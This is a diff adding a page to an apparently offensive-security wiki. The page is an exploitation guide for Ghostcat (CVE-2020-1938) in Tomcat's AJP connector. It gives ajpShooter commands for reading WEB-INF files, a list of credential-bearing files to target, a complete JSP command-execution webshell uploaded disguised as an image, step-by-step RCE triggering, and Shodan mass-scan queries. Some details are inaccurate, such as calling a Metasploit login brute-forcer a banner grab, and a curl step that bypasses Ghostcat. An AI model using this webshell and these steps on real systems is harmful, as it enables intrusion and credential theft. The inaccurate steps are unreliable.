@@ -1,0 +1,168 @@
+---
+title: Ghostcat (CVE-2020-1938)
+description: Tomcat AJP file inclusion and RCE via attribute injection - exploitation, scope, and detection.
+mitre: [T1190, T1210]
+d3fend: [D3-SU, D3-ACH, D3-ITF]
+impact: [FileRead, RCE]
+owasp: [A02, A03]
+cve: [CVE-2020-1938]
+sidebar:
+  order: 2
+  label: Ghostcat
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Tomcat's AJP connector has a design flaw: the protocol allows arbitrary servlet attributes (`javax.servlet.include.request_uri`, `.servlet_path`, `.path_info`) to be set per-request. Setting them to point at `/WEB-INF/web.xml` or any file inside the webapp directory makes Tomcat's `DefaultServlet` serve that file as a static resource - bypassing the normal restriction that `/WEB-INF/` is private.
+
+If the application allows file *upload* anywhere (avatar, document, even logs), the same primitive can include the uploaded file as a JSP - turning file disclosure into RCE.
+
+```bash
+# File disclosure
+python ajpShooter.py http://<TARGET>:8080 8009 /WEB-INF/web.xml read
+
+# RCE (requires file upload primitive on the same Tomcat)
+python ajpShooter.py http://<TARGET>:8080 8009 /uploads/shell.jpg eval
+```
+
+Success indicator: contents of `web.xml` (or any `WEB-INF/` file) returned in the response.
+
+## Affected versions
+
+| Tomcat | Status |
+| --- | --- |
+| 9.0.0.M1 - 9.0.30 | Vulnerable |
+| 8.5.0 - 8.5.50 | Vulnerable |
+| 7.0.0 - 7.0.99 | Vulnerable |
+| 6.x | Vulnerable (EOL) |
+| 9.0.31+, 8.5.51+, 7.0.100+ | Patched (`requiredSecret` enforced) |
+
+Patched versions enforce a shared secret on AJP. Without the secret, the attribute-injection primitive doesn't work. But: many real-world Tomcat deployments are patched-but-misconfigured - admins set `requiredSecret=""` (empty) or revert the setting during troubleshooting.
+
+## Exploitation
+
+### File disclosure
+
+[ajpShooter](https://github.com/00theway/Ghostcat-CNVD-2020-10487) is the canonical tool. It speaks AJP directly, no proxy needed.
+
+```bash
+git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
+cd Ghostcat-CNVD-2020-10487
+python ajpShooter.py http://<TARGET>:8080 8009 /WEB-INF/web.xml read
+```
+
+Targets worth reading:
+
+| Path | Why |
+| --- | --- |
+| `/WEB-INF/web.xml` | Servlet mappings, sometimes credentials in init-params |
+| `/WEB-INF/classes/application.properties` | Spring config - DB creds, API keys |
+| `/WEB-INF/classes/META-INF/persistence.xml` | JPA config - DB creds |
+| `/WEB-INF/classes/com/<package>/<Class>.class` | Source code (decompile with `procyon`/`cfr`) |
+| `/META-INF/context.xml` | Tomcat context - sometimes manager creds |
+| `/WEB-INF/lib/*.jar` | Library JARs - version disclosure for chained CVEs |
+
+The `http://<TARGET>:8080` argument is the HTTP port for response delivery; `8009` is the AJP port. ajpShooter sends the AJP request and reads the response over the HTTP port the response is forwarded to.
+
+### Manual exploitation (without ajpShooter)
+
+When you can't run third-party tools - pivoting, restricted box, paranoid op:
+
+```python
+# Minimal AJP client in Python - sets the three attributes and reads the response
+# See: github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py
+# Or: nmap --script ajp-* scripts (read-only, no file disclosure)
+```
+
+Realistically, run ajpShooter from a staging box and copy the output. Hand-rolling AJP packets is rarely worth the time.
+
+### Escalation to RCE
+
+The attribute-injection primitive doesn't give RCE on its own - it gives `DefaultServlet` file inclusion. RCE requires *also* having a way to write a JSP-content file somewhere inside the webapp directory.
+
+Common upload primitives that yield RCE:
+
+<Steps>
+
+1. **Find any file upload feature.** Avatar, document upload, log import, certificate upload. The file extension does not matter - Ghostcat will execute it as JSP regardless of `.jpg`/`.txt`/whatever.
+
+2. **Upload a JSP webshell with the wrong extension:**
+
+   ```java
+   <%@ page import="java.util.*,java.io.*"%>
+   <%
+   String cmd = request.getParameter("c");
+   if (cmd != null) {
+       Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
+       BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+       String line;
+       while ((line = r.readLine()) != null) out.println(line);
+   }
+   %>
+   ```
+
+   Save as `shell.jpg`, upload via the avatar feature.
+
+3. **Note the upload path.** Look at the response - many uploaders return the URL like `/uploads/12345.jpg`. The path inside the webapp filesystem is what you need (`/uploads/12345.jpg` typically maps to `webapps/<app>/uploads/12345.jpg`).
+
+4. **Trigger via Ghostcat eval mode:**
+
+   ```bash
+   python ajpShooter.py http://<TARGET>:8080 8009 /uploads/12345.jpg eval
+   ```
+
+   The `eval` mode forces JSP processing on the included file. Output appears in the HTTP response.
+
+5. **Execute commands:**
+
+   ```bash
+   python ajpShooter.py http://<TARGET>:8080 8009 /uploads/12345.jpg eval
+   # Then in the response, look for the parameter prompt - or use:
+   curl "http://<TARGET>:8080/uploads/12345.jpg?c=id"
+   ```
+
+</Steps>
+
+<Aside type="caution">
+The `eval` primitive runs as the Tomcat user, often `tomcat` with limited privileges, but sometimes `root` in container deployments. Either way, RCE - escalate from there with normal Linux privesc tradecraft.
+</Aside>
+
+## Detection of vulnerable hosts
+
+```bash
+# Nmap NSE (non-destructive)
+nmap -p 8009 --script ajp-headers <TARGET>
+
+# Banner grab via Metasploit
+msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <TARGET>; run; exit"
+
+# Mass scan with Shodan
+# Search: port:8009 product:"Apache Jserv"
+```
+
+ajpShooter's `read` mode is itself a detection - request `/WEB-INF/web.xml` and check whether content is returned (vulnerable) or `403`/empty (patched or no `WEB-INF` at that path).
+
+## Scope of impact
+
+When Ghostcat works, you have:
+
+- **Full read access** to anything under the webapp root directory the AJP servlet processes - including configuration files, source code, internal API specs, hardcoded credentials
+- **Conditional RCE** when combined with any file-write primitive (file upload, log injection if logs land in webapp dir, even SSRF that fetches a file)
+- **Source code** for decompilation and offline vulnerability discovery (this often reveals additional CVEs for the same target)
+
+Practical target hierarchy: `web.xml` first (always) → application config files (Spring/Hibernate) → individual `.class` files for the most interesting endpoints. Decompile to look for hardcoded creds, JWT secrets, encryption keys, and SQL queries that look exploitable.
+
+## Common failure modes
+
+- **`requiredSecret` enforced.** ajpShooter returns errors or empty responses. Tomcat is patched-and-configured-correctly. Pivot to the [proxy approach](/codex/web/server-side/intermediary/) if you have manager creds, or move on.
+- **File disclosure works but RCE doesn't trigger.** The included file isn't a real JSP, or the upload path isn't inside the webapp directory. Check the upload's actual filesystem location (some apps store uploads outside the webapp root, in which case Ghostcat can't include them).
+- **`DefaultServlet` not mapped.** Some hardened deployments remove the default static-content servlet. Without it, the include primitive has no servlet to abuse. Rare but possible.
+- **Path traversal blocked.** Ghostcat doesn't actually need traversal - it works with paths *inside* the webapp dir. If you're trying to read `/etc/passwd`, you want a different bug; Ghostcat is webapp-dir-scoped.
+- **Tomcat 9.0.31+ with empty `requiredSecret=""`.** Looks patched, isn't. The patch enforces *some* secret being set; an empty string is sometimes accepted depending on configuration. ajpShooter still works.
+
+## Notes
+
+Ghostcat is a *protocol design* flaw, not an implementation bug - which is why it sat unpatched for over a decade. The patch had to introduce a new requirement (`requiredSecret`) rather than fix existing behavior, because the existing behavior was specified. This is also why "look at the version number" isn't enough on real engagements: a patched Tomcat can still be vulnerable if the secret isn't actually set, and admins frequently disable `requiredSecret` during migrations and forget to re-enable it.
+
+The most underrated value of Ghostcat isn't the immediate disclosure - it's the *source code access*, which gives you offline analysis time on the running application. Pull the JARs, decompile, find the next bug.
